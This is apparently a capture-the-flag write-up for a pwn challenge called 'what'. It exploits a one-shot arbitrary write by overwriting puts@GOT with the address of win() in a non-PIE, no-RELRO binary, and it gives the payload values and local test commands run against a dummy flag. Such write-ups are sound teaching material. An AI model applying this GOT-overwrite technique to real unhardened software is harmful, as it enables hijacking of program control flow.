# what

## Summary

This is a one-shot arbitrary write challenge.

The program asks for two unsigned long integers, then does:

```c
scanf("%lu", &where);
scanf("%lu", &what);
*(unsigned long *)where = what;
puts("Goodbye!");
```

Because the binary is:

- non-PIE
- no RELRO
- NX enabled

the clean solution is to overwrite a writable GOT entry with the address of `win()`.

## Exploit

`main()` prints a prompt, reads the destination pointer and the value, performs the write, then
calls `puts("Goodbye!")`.

That means:

1. choose `puts@GOT` as the write target
2. write the address of `win()` into it
3. when `main()` reaches the final `puts`, execution is redirected into `win()`

Relevant fixed addresses from the binary:

- `puts@GOT = 0x403430`
- `win      = 0x401236`

So the payload is just the decimal form of those two numbers:

```text
4207664
4198966
```

## Why It Works

- `No RELRO` leaves the GOT writable.
- `No PIE` makes both `puts@GOT` and `win()` stable.
- The stack canary is irrelevant because there is no stack overflow to exploit.

## Local Verification

The shipped bundle does not include a real `flag.txt`, so I verified the control flow locally with a
dummy file:

```bash
mkdir -p /tmp/what
cp chall /tmp/what/chall
chmod +x /tmp/what/chall
printf '0xfun{local_test_flag}\n' > /tmp/what/flag.txt
printf '4207664\n4198966\n' | /tmp/what/chall
```

That prints:

```text
I like what you GOT! Take this: 0xfun{local_test_flag}
```
